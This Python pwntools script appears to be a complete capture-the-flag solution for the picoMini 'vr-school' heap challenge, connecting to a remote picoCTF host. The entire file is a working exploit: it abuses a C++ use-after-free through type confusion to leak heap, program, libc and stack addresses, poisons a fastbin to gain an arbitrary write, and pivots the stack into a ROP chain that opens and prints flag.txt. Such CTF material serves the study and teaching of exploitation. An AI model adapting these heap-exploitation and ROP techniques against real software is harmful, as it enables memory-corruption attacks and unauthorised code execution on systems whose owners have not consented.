#!/usr/bin/env python3
# vr-school - picoMini by redpwn (Binary Exploitation, Hard) by notdeghost
# C++ UAF: "Remote student" frees but does not null the students[] slot.
# Exploit (tsheinen): type-confuse a freed Student with a name buffer to build a
# fake Student -> arbitrary read (heap/PIE/libc/stack leaks) + fastbin dup for a
# 24-byte arbitrary write -> overwrite a saved RIP with "pop rsp" pivot onto a
# heap ROP chain (ORW flag.txt under seccomp).
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = args.HOST or "mars.picoctf.net"
PORT = int(args.PORT or 31638)

MENU_DELIM = b"4. Remote student\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"


def conn():
    return remote(HOST, PORT)


def leak_heap(r):
    r.sendline(b"0 0 0")
    r.sendlineafter(MENU_DELIM, b"1 0 24")
    r.sendline(b" ".join([b"48" for _ in range(24)]))
    for i in range(6):
        r.sendlineafter(MENU_DELIM, f"0 {i + 1} 0".encode())
    r.sendlineafter(MENU_DELIM, b"4 1")
    r.sendlineafter(MENU_DELIM, b"4 2")
    r.sendlineafter(MENU_DELIM, b"4 0")
    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")
    r.sendline(b"2 0")
    heap_value = u64(r.recvline().rstrip().ljust(8, b"\x00"))
    r.recvuntil(b"choice: \n")
    return heap_value - 0x13CF0


def leak_program_base(r):
    r.sendline(b"0 0 0")
    r.sendlineafter(MENU_DELIM, b"1 0 24")
    r.sendline(b" ".join([b"48" for _ in range(24)]))
    r.sendlineafter(MENU_DELIM, b"4 3")
    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")
    r.sendline(b"4 0")
    r.sendline(b"0 1 0")
    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")
    r.sendline(b"2 0")
    program_value = u64(r.recvline().rstrip().ljust(8, b"\x00"))
    r.recvuntil(b"choice: \n")
    return program_value - 0x202CE8


def leak_libc_base(r, program_base):
    got_malloc_offset = 0x202F88
    r.sendline(b"0 0 0")
    r.sendlineafter(MENU_DELIM, b"0 1 0")
    r.sendlineafter(MENU_DELIM, b"4 0")
    r.sendlineafter(MENU_DELIM, b"1 1 24")
    fake_student = b"AAAAAAAA" + p64(program_base + got_malloc_offset) + p64(8)
    r.sendline(b" ".join([str(fake_student[x]).encode() for x in range(24)]))
    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")
    r.sendline(b"2 0")
    malloc_addr = u64(r.recv(6).rstrip().ljust(8, b"\x00"))
    r.recvuntil(b"choice: \n")
    return malloc_addr - 0x97140


def leak_stack_base(r, libc_base):
    r.sendline(b"0 0 0")
    r.sendlineafter(MENU_DELIM, b"0 1 0")
    r.sendlineafter(MENU_DELIM, b"4 0")
    r.sendlineafter(MENU_DELIM, b"1 1 24")
    fake_student = b"AAAAAAAA" + p64(libc_base + 0x3EE098) + p64(8)
    r.sendline(b" ".join([str(fake_student[x]).encode() for x in range(24)]))
    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")
    r.sendline(b"2 0")
    env_addr = u64(r.recv(6).rstrip().ljust(8, b"\x00"))
    r.recvuntil(b"choice: \n")
    return env_addr - 0x130


def poison_fastbin(r, target, value):
    assert len(value) == 24
    for i in range(9):
        r.sendline(f"0 {i} 0".encode())
        r.recvuntil(b"choice: \n")
    for i in range(7):
        r.sendline(f"4 {2 + i}".encode())
        r.recvuntil(b"choice: \n")
    r.sendline(b"4 0")
    r.sendline(b"4 1")
    r.sendline(b"4 0")
    for i in range(3):
        r.recvuntil(b"choice: \n")
    for i in range(7):
        r.sendline(f"0 3 0".encode())
        r.recvuntil(b"choice: \n")
    r.sendline(b"1 0 24")
    dup_chunk = p64(target) + b"A" * 16
    r.sendline(b" ".join([str(dup_chunk[x]).encode() for x in range(24)]))
    r.sendline(b"0 0 0")
    r.sendline(b"0 0 0")
    r.sendlineafter(MENU_DELIM, b"1 0 24")
    r.sendline(b" ".join([str(value[x]).encode() for x in range(24)]))
    for i in range(4):
        r.recvuntil(b"choice: \n")


def main():
    r = conn()
    r.recvuntil(MENU_DELIM)

    heap_base = leak_heap(r)
    log.info("heap base: " + hex(heap_base))
    program_base = leak_program_base(r)
    log.info("program base: " + hex(program_base))
    libc_base = leak_libc_base(r, program_base)
    log.info("libc base: " + hex(libc_base))
    stack_ret = leak_stack_base(r, libc_base)
    log.info("stored RIP: " + hex(stack_ret))

    pop_rax = libc_base + 0x43AE8
    pop_rdi = libc_base + 0x215BF
    pop_rsi = libc_base + 0x23EEA
    pop_rdx = libc_base + 0x1B96
    syscall_ret = libc_base + 0xD2745
    pop_rsp = libc_base + 0x3960

    flag_heap_addr = heap_base + 0x13630
    heap_rop_address = heap_base + 0x12DD0
    flag_read_address = program_base + 0x203048

    chain = b""
    chain += p64(pop_rax) + p64(2)
    chain += p64(pop_rdi) + p64(flag_heap_addr)
    chain += p64(pop_rsi) + p64(0)
    chain += p64(pop_rdx) + p64(0)
    chain += p64(syscall_ret)
    chain += p64(pop_rax) + p64(0)
    chain += p64(pop_rdi) + p64(3)
    chain += p64(pop_rsi) + p64(flag_read_address)
    chain += p64(pop_rdx) + p64(64)
    chain += p64(syscall_ret)
    chain += p64(pop_rax) + p64(1)
    chain += p64(pop_rdi) + p64(1)
    chain += p64(pop_rsi) + p64(flag_read_address)
    chain += p64(pop_rdx) + p64(64)
    chain += p64(syscall_ret)

    r.sendline(b"0 15 0")
    r.sendline(b"1 15 500")
    r.sendline(b" ".join([str(x).encode() for x in chain.ljust(500, b"\x00")]))
    r.sendline(b"0 14 0")
    r.sendline(b"1 14 500")
    r.sendline(b" ".join([str(x).encode() for x in b"flag.txt".ljust(500, b"\x00")]))
    for i in range(3):
        r.recvuntil(b"choice: \n")

    poison_fastbin(r, stack_ret, p64(pop_rsp) + p64(heap_rop_address) + p64(0))

    try:
        data = r.recvrepeat(5)
    except EOFError:
        data = b""
    print(data.decode(errors="replace"))
    import re

    m = re.search(rb"picoCTF\{[^}]+\}", data)
    if m:
        print("\n[+] FLAG:", m.group(0).decode())
    r.close()


if __name__ == "__main__":
    main()
